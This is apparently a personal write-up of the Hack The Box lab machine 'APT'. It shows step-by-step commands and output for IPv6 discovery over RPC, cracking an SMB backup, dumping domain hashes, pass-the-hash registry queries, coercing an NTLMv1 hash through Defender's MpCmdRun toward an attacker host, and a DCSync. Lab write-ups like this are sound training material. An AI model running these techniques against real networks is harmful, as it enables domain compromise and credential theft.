---
description: Challenging! Did with the help of a writeup.
---

# APT

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.60     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 14:58 +08
Nmap scan report for 10.129.96.60
Host is up (0.0095s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
```

This is supposed to be an AD machine, so seeing such few ports is kinda new.&#x20;

### Port 80

Port 80 has a corporate page of some hosting service company thing:

<figure><img src="../../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

Most of the text is just placeholder text. I added `gigantichosting.com` to my `/etc/hosts` file. Running `gobuster` and `wfuzz` for directory and subdomain searches return nothing of interest. I think we'll come back to this later.

### Port 135 RPC

The only other lead was this port. `impacket-rdcdump` can be used to enumerate it:

```
$ impacket-rpcdump -port 135 10.129.96.60
```

This would return a bunch of information, 266 endpoints to be specific. From the output, we can see loads of stuff like the processes running and what not. Amongst all of this, there were a lot of UUIDs given out like this:

```
Protocol: N/A 
Provider: N/A 
UUID    : D09BDEB5-6171-4A34-BFE2-06FA82652568 v1.0 
Bindings: 
          ncalrpc:[csebpub]
          ncalrpc:[LRPC-a850f136abb95870de]
          ncalrpc:[LRPC-7a0b8569b6e1526569]
          ncacn_np:\\APT[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-c40870e918e88c31c7]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-7a0b8569b6e1526569]
          ncacn_np:\\APT[\pipe\LSM_API_service]
          ncalrpc:[LSMApi]
          ncalrpc:[LRPC-c40870e918e88c31c7]
          ncalrpc:[actkernel]
          ncalrpc:[umpo]
          ncalrpc:[LRPC-1ea16861ef27d35888]
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.129.96.60[49665]
          ncacn_np:\\APT[\pipe\eventlog]
          ncalrpc:[eventlog]
          ncalrpc:[LRPC-f68cc198b33890086f]
```

I wasn't sure what to do with this information. I also could not connect via `rpcclient`, and there was no credentials I had. I spent quite a bit of time stuck here, and went to research more about RPC and its services.

### RPC Reading --> IPv6 Address

Here's a resource that I used to read more about RPC.&#x20;

{% embed url="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements" %}

Turns out, the ports 135-139 all have different purposes depsite being grouped under the SMB/RPC umbrella. Port 135 itself has specific services that are being used, and each of them sort of have their own 'interface'.&#x20;

My question was, why is it that the only services picked up by `nmap` are port 80 and 135? From the output of `impacket-rpcdump`, there were loads of services in use like `dns.exe` and what not.&#x20;

I googled a bit more about RPC and found someone else's pentesting notebook that had a command I did not recognise.

{% embed url="https://tenaka.gitbook.io/pentesting/enumeration/ldap-ad-dc/rpc" %}

A tool called `IOXIDResolver.py` was being used.&#x20;

{% embed url="https://github.com/mubix/IOXIDResolver" %}

I took a look at 0xdf's writeup (because I really didn't know what was going on) and found that he used the same tool as well. The trick here is that the 'AD' portion is listening on IPv6 instead of IPv4, and that since RPC was open on IPv4 we can resolve the addresses for the interfaces of services enumerated with `rpcdump`.

I ran the above script and found a new IP address:

```
$ python3 IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::900f:a96c:74f4:6644
Address: dead:beef::202
```

We now have 2 more addresses!&#x20;

### Re-enumeration --> SMB

I ran an `nmap` IPv6 scan (using `-6`) and found new ports:

```
$ nmap -p- --min-rate 5000 -Pn -6 dead:beef::b885:d62a:d679:573f
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 15:26 +08
Nmap scan report for dead:beef::b885:d62a:d679:573f
Host is up (0.0076s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49689/tcp open  unknown
56964/tcp open  unknown
```

Now this was looking more AD-like. Remember that this is an IPv6 address, so most tools I tried just didn't work. `crackmapexec` was one of them that worked:

```
$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u '' -p '' 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 

$ crackmapexec smb dead:beef::b885:d62a:d679:573f -u '' -p '' --shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares
SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark                                                                                 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------                                                                                 
SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ                                                                                                   
SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC                                                                             
SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share                                                                     
SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL
```

We have access to a `backup` share using null credentials. `smbclient` supports IPv6, and we can use that to login and view the files:

```
$ smbclient \\\\dead:beef::b885:d62a:d679:573f\\backup -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 15:30:52 2020
  ..                                  D        0  Thu Sep 24 15:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 15:30:32 2020
```

The `backup.zip` is password protected, so we can first `zip2john` it and then `john` it.&#x20;

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash   
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2023-06-22 15:32) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

$ unzip backup.zip                  
Archive:  backup.zip
[backup.zip] Active Directory/ntds.dit password: 
  inflating: Active Directory/ntds.dit  
  inflating: Active Directory/ntds.jfm  
   creating: registry/
  inflating: registry/SECURITY       
  inflating: registry/SYSTEM
```

Interesting. We can use `secretsdump.py` to get all the hashes out, and there were A LOT. A few thousand to be specific.&#x20;

```
$ impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL > hashes
```

There was no way the machine had 2000 users, so we need to first find out which are the valid users.

### User Brute --> Hash Brute

We can first use `grep` to retrieve the users present in the file. Each user's entry ends with `:::`, which we can use `grep` to retrieve and then `awk` to print out the first field.&#x20;

```
$ grep ':::' hashes | awk -F ':' {'print $1'}  > users
```

I also added the following entry to my `/etc/hosts` file:

```
dead:beef::b885:d62a:d679:573f htb.local dc.htb.local
```

Afterwards, we can brute force this using `kerbrute` as per Hacktricks:

```
$ ~/usefulfiles/kerbrute_linux_amd64 userenum -d htb.local --dc dc.htb.local ~/htb/apt/users
2023/06/22 15:45:27 >  [+] VALID USERNAME:       APT$@htb.local
2023/06/22 15:45:27 >  [+] VALID USERNAME:       Administrator@htb.local
2023/06/22 15:49:39 >  [+] VALID USERNAME:       henry.vinson@htb.local
```

So we do have one valid-user present. The only problem is now we need to find the correct hash for this user, of which there are 2000 hashes...

We can still do roughly the same thing to get the hashes from the dump file, and then use `crackmapexec` to test the hashes.&#x20;

```
$ grep ':::' hashes | awk -F ':' {'print $4'}  > ntlm_hashes
$ crackmapexec smb htb.local -u henry.vinson -H ntlm_hashes
```

The machine has some type of protection in place preventing brute force, since I cannot run two brute force scans back to back (`kerbrute` and then `crackmapexec` for example) without it closing my connection and blocking my IP address.

Anyways, we will eventually find the right hash:

```
SMB         htb.local       445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
```

### PTH Reg Query

We cannot use this hash to `evil-winrm` in unfortunately, as it seems this user is not part of the Remote Management Group. However, this does not stop us from retrieving tickets as the user. We can use `getTGT.py` to request for a TGT.

```
$ impacket-getTGT htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbffb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in henry.vinson.ccache
$ export KRB5CCNAME=henry.vinson.ccache
```

Also, we can use this hash to connect to RPC or view the registry using Impacket tools. Digging around the Impacket suite of tools, we find `impacket-reg` which can be used to query the registry.

The hardest part was finding the name of the registry to query. Most examples online used `HKLM\\SOFTWARE` or `HKCU\\SOFTWARE`. Our target should be the current user registry. It was this article that introduced me to `HKU` being another name:

{% embed url="https://www.pdq.com/blog/modify-the-registry-of-another-user/" %}

This works with `reg.py`:

```
$ impacket-reg htb.local/henry.vinson@apt.htb -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKU\\SOFTWARE -s
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
SOFTWARE\GiganticHostingManagementSystem\
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht
<TRUNCATED>
```

Then, we can `evil-winrm` in:

<figure><img src="../../../.gitbook/assets/image (1337).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Finding Defences

I tried to run `winpeas.exe`, but it seems that AMSI and what not is present on the system:

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop> .\winpeas.exe
Program 'winpeas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\winpeas.exe
+ ~~~~~~~~~~~~~.
At line:1 char:1
+ .\winpeas.exe
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Windows Defender was also active on this machine because my `winpeas.exe` was deleted after.&#x20;

### NTLMv1 --> Steal Hash

I enumerated this machine manually because Defender was present. There was a Powershell History file present:

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\APPDATA\Roaming\Microsoft\Windows\Powershell\PSReadline> cat ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```
{% endcode %}

This command basically states that NTLMv1 is enabled on this machine instead of the more secure NTLMv2. This opens up the potential for NTLM stealing.&#x20;

{% embed url="https://dirteam.com/sander/2022/06/15/howto-detect-ntlmv1-authentication/" %}

We just need to somehow use a service run by the Administrator to steal the hashes. Turns out, Windows Defender here can be used:

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse#defender-mpcmdrun" %}

```
*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.42\file
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
```

<figure><img src="../../../.gitbook/assets/image (1470).png" alt=""><figcaption></figcaption></figure>

We now have an NTLMv1 hash! Googling how to crack this leads me to this site:

{% embed url="https://crack.sh/get-cracking/" %}

This would convert it to an NTLM hash that we can pass along, of which we get `d167c3238864b12f5f82feae86a7f798`. Since this is the machine account `APT$`, we can perform a DCSync attack on the domain.&#x20;

```
$ secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
```

Afterwards, we can use this hash to `evil-winrm` into the machine.&#x20;

<figure><img src="../../../.gitbook/assets/image (364).png" alt=""><figcaption></figcaption></figure>

A unique machine that was rather difficult for me. I definitely needed to use a writeup for this one, or I would still be stuck at the RPC part. Rooted!&#x20;
